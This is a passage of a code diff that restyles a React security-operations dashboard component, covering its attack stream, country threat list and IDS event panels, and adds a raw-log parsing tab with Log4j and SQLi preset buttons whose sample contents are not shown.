-              </button>
-            )}
-          </div>
-
-          {/* Search bar inside deck */}
-          <div className="p-2 border-b border-cyan-500/10 bg-[#060a14]">
-            <div className="relative">
-              <Search className="w-3.5 h-3.5 text-slate-500 absolute left-2.5 top-1/2 -translate-y-1/2" />
-              <input
-                type="text"
-                value={searchQuery}
-                onChange={(e) => setSearchQuery(e.target.value)}
-                placeholder={
-                  rightDeckTab === 'stream'
-                    ? 'Search actor, vector, city, CVE...'
-                    : rightDeckTab === 'ids'
-                    ? 'Search IP, port, signature, or phase...'
-                    : 'Search all 177 countries, code, or APT actors...'
-                }
-                className="w-full pl-8 pr-3 py-1.5 text-xs bg-slate-900/80 border border-cyan-500/20 rounded-xl text-white placeholder-slate-500 focus:outline-none focus:border-cyan-400"
-              />
-            </div>
-          </div>
-
-          {/* Deck Body */}
-          <div className="flex-1 p-2.5 space-y-2 overflow-y-auto scrollbar-thin scrollbar-thumb-cyan-500/20 scrollbar-track-transparent">
-            {rightDeckTab === 'stream' ? (
-              // Live Attacks Stream
-              filteredAttacks.map((atk) => {
-                const isSelected = selectedAttack?.id === atk.id;
-                const isCrit = atk.severity === 'CRITICAL';
-
-                return (
-                  <div
-                    key={atk.id}
-                    onClick={() => handleSelectAttack(atk)}
-                    className={`p-2.5 rounded-xl border transition-all cursor-pointer relative group ${
-                      isSelected
-                        ? 'bg-gradient-to-r from-cyan-950/70 to-blue-950/70 border-cyan-400 shadow-[0_0_15px_rgba(0,240,255,0.2)]'
-                        : isCrit
-                        ? 'bg-[#0e1424] border-red-500/30 hover:border-red-400/60 hover:bg-[#121b30]'
-                        : 'bg-[#0a101e] border-cyan-500/15 hover:border-cyan-500/40 hover:bg-[#0e172a]'
-                    }`}
-                  >
-                    <div className="flex items-center justify-between text-[11px]">
-                      <div className="flex items-center gap-1.5 font-bold text-white">
-                        <span>{atk.sourceFlag} {atk.sourceCity}</span>
-                        <span className="text-cyan-400 font-mono">⟶</span>
-                        <span>{atk.targetFlag} {atk.targetCity}</span>
-                      </div>
-
-                      <div className="flex items-center gap-1">
-                        <span
-                          className={`text-[9px] px-1.5 py-0.5 rounded font-bold ${
-                            isCrit
-                              ? 'bg-red-500/20 text-red-400 border border-red-500/30'
-                              : 'bg-yellow-500/20 text-yellow-400 border border-yellow-500/30'
-                          }`}
-                        >
-                          {atk.severity}
-                        </span>
-                        <span className="text-[10px] text-slate-500 font-mono">{atk.timestamp}</span>
-                      </div>
-                    </div>
-
-                    <div className="mt-1.5 flex items-start justify-between gap-2">
-                      <div>
-                        <div className="text-[11px] font-bold text-red-400 flex items-center gap-1">
-                          <AlertTriangle className="w-3 h-3 text-red-400 shrink-0" />
-                          <span className="truncate">{atk.threatActor}</span>
-                        </div>
-                        <div className="text-[10px] text-slate-400 truncate max-w-[220px]">
-                          {atk.vector}
-                        </div>
-                      </div>
-
-                      {atk.cve && (
-                        <span className="text-[9px] px-1.5 py-0.5 rounded bg-purple-950/60 border border-purple-500/40 text-purple-300 font-bold shrink-0">
-                          {atk.cve}
-                        </span>
-                      )}
-                    </div>
-
-                    <div className="mt-2 pt-1.5 border-t border-cyan-500/10 flex items-center justify-between text-[10px]">
-                      <span className="text-emerald-400 flex items-center gap-1">
-                        <ShieldCheck className="w-3 h-3 text-emerald-400" />
-                        {atk.status || 'BLOCKED'}
-                      </span>
-                      <span className="text-cyan-400 opacity-0 group-hover:opacity-100 transition-opacity flex items-center gap-0.5 font-bold">
-                        <Crosshair className="w-3 h-3" /> Focus on Globe
-                      </span>
-                    </div>
-                  </div>
-                );
-              })
-            ) : rightDeckTab === 'countries' ? (
-              // Real 177+ Sovereign Country Threat Rankings (Dot Density Matrix)
-              filteredCountries.map((ct) => {
-                const isSelected = selectedCountry?.country === ct.country;
-                return (
-                  <div
-                    key={ct.country}
-                    onClick={() => handleSelectCountry(ct)}
-                    className={`p-3 rounded-xl border transition-all cursor-pointer relative group ${
-                      isSelected
-                        ? 'bg-gradient-to-r from-yellow-950/60 to-slate-900 border-yellow-400 shadow-[0_0_15px_rgba(245,158,11,0.25)]'
-                        : 'bg-[#0a101e] border-cyan-500/15 hover:border-yellow-500/40 hover:bg-[#0e172a]'
-                    }`}
-                  >
-                    <div className="flex items-center justify-between">
-                      <div className="flex items-center gap-2">
-                        <span className="text-lg">{ct.flag}</span>
-                        <div>
-                          <div className="text-xs font-bold text-white flex items-center gap-1.5">
-                            <span>{ct.country}</span>
-                            <span className="text-[9px] px-1.5 py-0.2 rounded bg-slate-800 text-slate-400 border border-slate-700 font-mono">
-                              {ct.code}
-                            </span>
-                          </div>
-                          <div className="text-[10px] text-slate-400 truncate max-w-[200px]">
-                            {ct.dots.length} Distributed Hotspot Nodes
-                          </div>
-                        </div>
-                      </div>
-
-                      <div className="text-right">
-                        <div className="text-xs font-black font-mono text-yellow-400">
-                          {ct.incidentCount.toLocaleString()}
-                        </div>
-                        <div className="text-[9px] text-slate-500 uppercase">Total Ingress</div>
-                      </div>
-                    </div>
-
-                    <div className="mt-2 pt-2 border-t border-cyan-500/10 flex items-center justify-between text-[10px]">
-                      <span className="text-slate-400 truncate max-w-[210px]">
-                        Actors: <span className="text-red-300 font-bold">{ct.topActors.slice(0, 2).join(', ')}</span>
-                      </span>
-                      <span className="text-yellow-400 opacity-0 group-hover:opacity-100 transition-opacity flex items-center gap-1 font-bold">
-                        <Crosshair className="w-3 h-3" /> Focus Dots
-                      </span>
-                    </div>
-                  </div>
-                );
-              })
-            ) : (
-              // Live Active Network & Web IDS Traffic Stream
               <div className="space-y-2">
-                {/* IDS Mini-Telemetry Dashboard */}
-                <div className="p-2.5 rounded-xl bg-slate-950/80 border border-emerald-500/30 flex items-center justify-between text-[11px]">
+                {/* IDS Mini-Telemetry Bar */}
+                <div className="p-2 rounded bg-slate-900/80 border border-slate-800 flex items-center justify-between text-[11px]">
                   <div className="flex items-center gap-2">
-                    <span className="w-2 h-2 rounded-full bg-emerald-400 animate-ping" />
-                    <span className="text-emerald-400 font-bold">SENSOR ARMED</span>
+                    <span className="w-2 h-2 rounded-full bg-emerald-400" />
+                    <span className="text-emerald-400 font-bold font-mono">SURICATA SENSOR ACTIVE</span>
                   </div>
-                  <div className="text-slate-400">
-                    Security Score: <span className="text-emerald-300 font-bold">{idsStats.securityScore}%</span> | Blocked: <span className="text-cyan-300 font-bold">{idsStats.threatsBlocked}</span>
+                  <div className="text-slate-400 font-mono text-[10px]">
+                    Events: <span className="text-white font-semibold">{idsEvents.length}</span> | Blocked: <span className="text-red-400 font-semibold">{blockedIps.size}</span>
                   </div>
                 </div>
 
                 {filteredIdsEvents.length === 0 ? (
-                  <div className="p-6 text-center text-slate-500 border border-dashed border-cyan-500/20 rounded-xl">
+                  <div className="p-6 text-center text-xs text-slate-500 border border-dashed border-slate-800 rounded">
                     No active intrusion signatures detected.
                   </div>
                 ) : (
@@ -543,58 +534,58 @@ export const SocView: React.FC<SocViewProps> = ({
                     return (
                       <div
                         key={evt.id}
-                        className={`p-3 rounded-xl border transition-all ${
+                        className={`p-2.5 rounded border transition-all ${
                           isCrit
-                            ? 'bg-red-950/30 border-red-500/40'
-                            : 'bg-[#0a101e] border-emerald-500/20'
+                            ? 'bg-red-950/20 border-red-900/50'
+                            : 'bg-[#090e18] border-slate-800'
                         }`}
                       >
-                        <div className="flex items-center justify-between mb-1.5">
-                          <div className="flex items-center gap-1.5 font-bold text-white text-[11px]">
+                        <div className="flex items-center justify-between mb-1">
+                          <div className="flex items-center gap-1.5 font-mono text-xs text-white">
                             <span>{evt.countryFlag}</span>
-                            <span className="text-red-400">{evt.sourceIp}</span>
-                            <span className="text-slate-500">⟶</span>
-                            <span className="text-cyan-300 truncate max-w-[150px]">{evt.targetEndpoint}</span>
+                            <span className="text-red-400 font-bold">{evt.sourceIp}</span>
+                            <span className="text-slate-600">⟶</span>
+                            <span className="text-slate-300 truncate max-w-[140px]">{evt.targetEndpoint}</span>
                           </div>
                           <span
-                            className={`text-[9px] px-1.5 py-0.5 rounded font-bold uppercase ${
+                            className={`text-[9px] px-1.5 py-0.5 rounded font-mono font-bold uppercase ${
                               isBlocked
-                                ? 'bg-emerald-950 text-emerald-400 border border-emerald-500/40'
-                                : 'bg-red-950 text-red-400 border border-red-500/40'
+                                ? 'bg-emerald-950 text-emerald-400 border border-emerald-800/60'
+                                : 'bg-red-950 text-red-400 border border-red-800/60'
                             }`}
                           >
-                            {isBlocked ? 'BLOCKED' : 'ALERT'}
+                            {isBlocked ? 'BLOCKED' : 'DETECTED'}
                           </span>
                         </div>
 
-                        <div className="text-xs font-bold text-slate-200 mb-1">
+                        <div className="text-xs font-semibold text-slate-200 mb-0.5">
                           {evt.eventType}
                         </div>
 
-                        <div className="text-[10px] text-slate-400 font-mono mb-2">
-                          Sig: <span className="text-amber-300">{evt.signature}</span> | {evt.mitreTechnique}
+                        <div className="text-[10px] text-slate-400 font-mono mb-1.5">
+                          Sig: <span className="text-amber-300">{evt.signature}</span> · {evt.mitreTechnique}
                         </div>
 
-                        <div className="p-2 rounded-lg bg-black/40 border border-white/5 text-[10px] text-slate-300 mb-2">
+                        <div className="p-1.5 rounded bg-slate-900/60 border border-slate-800 text-[10px] text-slate-300 font-sans mb-2">
                           {evt.mitigationTip}
                         </div>
 
-                        <div className="flex items-center justify-between pt-1 border-t border-white/5">
-                          <span className="text-[9px] text-slate-500">{evt.timestamp}</span>
+                        <div className="flex items-center justify-between pt-1 border-t border-slate-800/60">
+                          <span className="text-[9px] text-slate-500 font-mono">{evt.timestamp}</span>
                           <div className="flex items-center gap-1.5">
                             {!isBlocked && (
                               <button
                                 onClick={() => handleBlockIp(evt.sourceIp)}
-                                className="px-2.5 py-1 rounded bg-red-600/80 hover:bg-red-500 text-white font-bold text-[10px] flex items-center gap-1 transition-colors cursor-pointer"
+                                className="px-2 py-0.5 rounded bg-red-700/80 hover:bg-red-600 text-white font-mono text-[10px] flex items-center gap-1 transition-colors cursor-pointer"
                               >
                                 <Zap className="w-2.5 h-2.5" />
-                                <span>Block IP</span>
+                                <span>Drop IP</span>
                               </button>
                             )}
                             {onOpenAiSwarm && (
                               <button
-                                onClick={() => onOpenAiSwarm(`Formulate immediate incident response playbook for: ${evt.eventType} (${evt.signature}) from IP ${evt.sourceIp} targeting ${evt.targetEndpoint}`)}
-                                className="p-1 rounded bg-purple-500/20 hover:bg-purple-500/30 text-purple-300 border border-purple-500/30 cursor-pointer"
+                                onClick={() => onOpenAiSwarm(`Formulate incident response for: ${evt.eventType} (${evt.signature}) from IP ${evt.sourceIp}`)}
+                                className="p-1 rounded bg-slate-800 hover:bg-slate-700 text-slate-300 hover:text-white border border-slate-700 cursor-pointer"
                                 title="Triage with AI Swarm"
                               >
                                 <Bot className="w-3 h-3" />
@@ -605,6 +596,166 @@ export const SocView: React.FC<SocViewProps> = ({
                       </div>
                     );
                   })
+                )}
+              </div>
+            )}
+
+            {rightDeckTab === 'countries' && (
+              filteredCountries.map((ct) => {
+                const isSelected = selectedCountry?.country === ct.country;
+                return (
+                  <div
+                    key={ct.country}
+                    onClick={() => handleSelectCountry(ct)}
+                    className={`p-2.5 rounded border transition-all cursor-pointer ${
+                      isSelected
+                        ? 'bg-amber-950/20 border-amber-500'
+                        : 'bg-[#090e18] border-slate-800 hover:border-slate-700 hover:bg-slate-900/50'
+                    }`}
+                  >
+                    <div className="flex items-center justify-between">
+                      <div className="flex items-center gap-2">
+                        <span className="text-base">{ct.flag}</span>
+                        <div>
+                          <div className="text-xs font-semibold text-white flex items-center gap-1.5">
+                            <span>{ct.country}</span>
+                            <span className="text-[9px] px-1 py-0.2 rounded bg-slate-800 text-slate-400 font-mono">
+                              {ct.code}
+                            </span>
+                          </div>
+                          <div className="text-[10px] text-slate-400 font-mono">
+                            {ct.dots.length} Sensor Nodes Online
+                          </div>
+                        </div>
+                      </div>
+
+                      <div className="text-right">
+                        <div className="text-xs font-bold font-mono text-amber-400">
+                          {ct.incidentCount.toLocaleString()}
+                        </div>
+                        <div className="text-[9px] text-slate-500 uppercase font-mono">Telemetry Events</div>
+                      </div>
+                    </div>
+
+                    <div className="mt-1.5 pt-1.5 border-t border-slate-800/80 flex items-center justify-between text-[10px]">
+                      <span className="text-slate-400 truncate max-w-[210px]">
+                        Actors: <span className="text-slate-200 font-mono">{ct.topActors.slice(0, 2).join(', ')}</span>
+                      </span>
+                      <span className="text-slate-400 font-mono flex items-center gap-0.5">
+                        <Crosshair className="w-2.5 h-2.5" /> Focus
+                      </span>
+                    </div>
+                  </div>
+                );
+              })
+            )}
+
+            {rightDeckTab === 'parser' && (
+              <div className="space-y-3">
+                <div className="p-2.5 rounded bg-slate-900/80 border border-slate-800">
+                  <div className="flex items-center justify-between mb-2">
+                    <span className="text-xs font-bold text-white font-mono flex items-center gap-1.5">
+                      <FileCode className="w-3.5 h-3.5 text-blue-400" />
+                      <span>RAW LOG INGESTION ENGINE</span>
+                    </span>
+                    <div className="flex items-center gap-1 text-[10px]">
+                      <span className="text-slate-400">Presets:</span>
+                      <button
+                        onClick={() => setRawLogInput(SAMPLE_LOG_PACKS.log4j)}
+                        className="px-1.5 py-0.5 rounded bg-slate-800 hover:bg-slate-700 text-slate-300 font-mono"
+                      >
+                        Log4j
+                      </button>
+                      <button
+                        onClick={() => setRawLogInput(SAMPLE_LOG_PACKS.sqli)}
+                        className="px-1.5 py-0.5 rounded bg-slate-800 hover:bg-slate-700 text-slate-300 font-mono"
+                      >
+                        SQLi
+                      </button>
+                    </div>
+                  </div>
+
+                  <textarea
+                    value={rawLogInput}
+                    onChange={(e) => setRawLogInput(e.target.value)}
+                    rows={6}
+                    placeholder="Paste raw Apache, Nginx, or Syslog lines here..."
+                    className="w-full p-2 bg-[#060a12] border border-slate-800 rounded font-mono text-[11px] text-slate-300 placeholder-slate-600 focus:outline-none focus:border-blue-500 resize-y"
+                  />
+
+                  <div className="mt-2 flex items-center justify-between">
+                    <span className="text-[10px] text-slate-500 font-mono">
+                      Parses IPv4, URIs, Status Codes, and ATT&CK patterns
+                    </span>
+                    <button
+                      onClick={handleParseLogs}
+                      disabled={isParsingLogs || !rawLogInput.trim()}
+                      className="px-3 py-1 rounded bg-blue-600 hover:bg-blue-500 text-white font-medium text-xs flex items-center gap-1.5 transition-colors cursor-pointer disabled:opacity-50"
+                    >
+                      <Play className="w-3 h-3" />
+                      <span>Parse & Ingest</span>
+                    </button>
+                  </div>
+                </div>
+
+                {/* Parsed Events List */}
+                {parsedEvents.length > 0 && (
+                  <div className="space-y-1.5">
+                    <div className="flex items-center justify-between text-[11px] px-1 font-mono">
+                      <span className="text-slate-400">Parsed Ingress Events ({parsedEvents.length})</span>
+                      <span className="text-emerald-400">Mapped to 3D Globe</span>
+                    </div>
+
+                    {parsedEvents.map((evt) => (
+                      <div
+                        key={evt.id}
+                        className={`p-2 rounded border text-xs font-mono ${
+                          evt.severity === 'CRITICAL'
+                            ? 'bg-red-950/20 border-red-900/50'
+                            : evt.severity === 'HIGH'
+                            ? 'bg-amber-950/20 border-amber-900/50'
+                            : 'bg-slate-900/50 border-slate-800'
+                        }`}
+                      >
+                        <div className="flex items-center justify-between mb-1">
+                          <div className="flex items-center gap-1.5 font-bold">
+                            <span className="text-red-400">{evt.sourceIp}</span>
+                            <span className="text-slate-600">⟶</span>
+                            <span className="text-slate-300 text-[11px]">{evt.httpMethod} {evt.statusCode}</span>
+                          </div>
+                          <span
+                            className={`text-[9px] px-1.5 py-0.2 rounded font-bold ${
+                              evt.severity === 'CRITICAL'
+                                ? 'bg-red-900/50 text-red-300 border border-red-800'
+                                : 'bg-amber-900/50 text-amber-300 border border-amber-800'
+                            }`}
+                          >
+                            {evt.severity}
+                          </span>
+                        </div>
+
+                        <div className="text-[11px] text-white font-sans font-medium">
+                          {evt.attackType}
+                        </div>
+
+                        <div className="text-[10px] text-slate-400 truncate mt-0.5">
+                          URI: {evt.uri}
+                        </div>
+
+                        <div className="mt-1 pt-1 border-t border-slate-800/80 flex items-center justify-between text-[10px]">
+                          <span className="text-slate-500">{evt.mitreTechnique}</span>
+                          <button
+                            onClick={() => handleBlockIp(evt.sourceIp)}
+                            disabled={blockedIps.has(evt.sourceIp)}
+                            className="px-1.5 py-0.5 rounded bg-red-900/40 hover:bg-red-800/60 text-red-300 text-[10px] flex items-center gap-1 transition-colors"
+                          >
+                            <Zap className="w-2.5 h-2.5" />
+                            <span>{blockedIps.has(evt.sourceIp) ? 'Dropped' : 'Drop IP'}</span>
+                          </button>
+                        </div>
+                      </div>
+                    ))}
+                  </div>
                 )}
               </div>
             )}
